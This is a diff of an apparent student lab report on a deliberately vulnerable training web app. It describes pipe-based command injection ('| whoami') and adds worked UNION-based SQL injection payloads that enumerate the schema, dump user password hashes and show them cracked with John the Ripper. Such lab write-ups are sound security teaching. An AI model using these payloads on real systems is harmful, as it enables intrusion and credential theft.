@@ -1,4 +1,4 @@
-\section*{Activitiy 1}
+\section*{Activity 1}
 
 \begin{enumerate}
 
@@ -9,12 +9,41 @@
     We can directly use a pipe to execute any command\footnote{As a pipe only redirects \texttt{stdout} and not \texttt{stderr}, by purposely making the \texttt{ping} command fail by not giving it an argument, enabling us to effectively concatenate another command.} e.g. \texttt{| whoami} (resulting in \texttt{ping -c | whoami}).\newline
     
     The \texttt{High} setting is even more strict, by validating the input. It splits the input into an array by using the \texttt{.} separator and checks that the first four numbers are integers, re-generating the IP using only those first four numbers.\\
-    I didn't find any way to exploit it.
+    I didn't find any way to exploit it, without modifying the packages so that it doesn't use that script.
     
 \end{enumerate}
 
 
-\section*{Activitiy 2}
+\section*{Activity 2}
+
+\begin{enumerate}
+    \item The PHP code outputs just the information of the columns \texttt{first\_name} and \texttt{last\_name}.\\
+    By using unions, we can trick the server into renaming columns of the table \\\texttt{information\_schema.tables}, which contains the names of all tables, to those the PHP script will display.\\
+    Inputting \texttt{' AND 1=0 UNION SELECT table\_name, NULL FROM information\_schema.tables \#} (resulting in the query \texttt{SELECT first\_name, last\_name FROM users WHERE user\_id = '' AND 1=0 UNION SELECT table\_name, NULL FROM information\_schema.tables \#'}), will make MySQL select no rows from \texttt{users} (\texttt{1=0} is always false), and put all the table names (and \texttt{null}, nothing, in the second column) in the correct columns. The \texttt{\#} is for commenting out the last \texttt{'}.
+    \item Modifying the previous query by appending \texttt{WHERE table\_name LIKE 'user\%'} (resulting in the query \texttt{SELECT first\_name, last\_name FROM users WHERE user\_id = '' AND 1=0 UNION SELECT table\_name, NULL FROM information\_schema.tables WHERE table\_name LIKE 'user\%' \#'}) we can output just the tables that start with "user". This returns, among others, the table \texttt{user}.\\
+    To output the columns of this table, we can use \texttt{' AND 1=0 UNION SELECT column\_name, NULL FROM information\_schema.columns WHERE table\_name = 'users' \#}, finding out the columns of that table are \texttt{user\_id}, \texttt{first\_name}, \texttt{last\_name}, \texttt{user}, \texttt{password}, and \texttt{avatar}.
+    \item Following the previous command structure, we use \texttt{' AND 1=0 UNION SELECT user, password FROM users \#} in order to get the users and passwords\footnote{You can replace one of the column names to \texttt{concat(user, ":", password)} in order to get a "cleaner" format for JTR.}.\\
+    This outputs the following users and (hashed) passwords:
+    \begin{itemize}
+        \item \texttt{admin:5f4dcc3b5aa765d61d8327deb882cf99}
+        \item \texttt{gordonb:e99a18c428cb38d5f260853678922e03}
+        \item \texttt{1337:8d3533d75ae2c3966d7e0d4fcc69216b}
+        \item \texttt{pablo:0d107d09f5bbe40cade3de5c71e9e9b7}
+        \item \texttt{smithy:5f4dcc3b5aa765d61d8327deb882cf99}
+    \end{itemize}
+    \item By using JohnTheRipper, we can crack those passwords, resulting in the following:
+    \begin{itemize}
+        \item \texttt{admin:password}
+        \item \texttt{gordonb:abc123}
+        \item \texttt{1337:charley}
+        \item \texttt{pablo:letmein}
+        \item \texttt{smithy:password}
+    \end{itemize}
+\end{enumerate}
+
+
+
+\section*{Activity3}
 
 \begin{enumerate}
     \item 
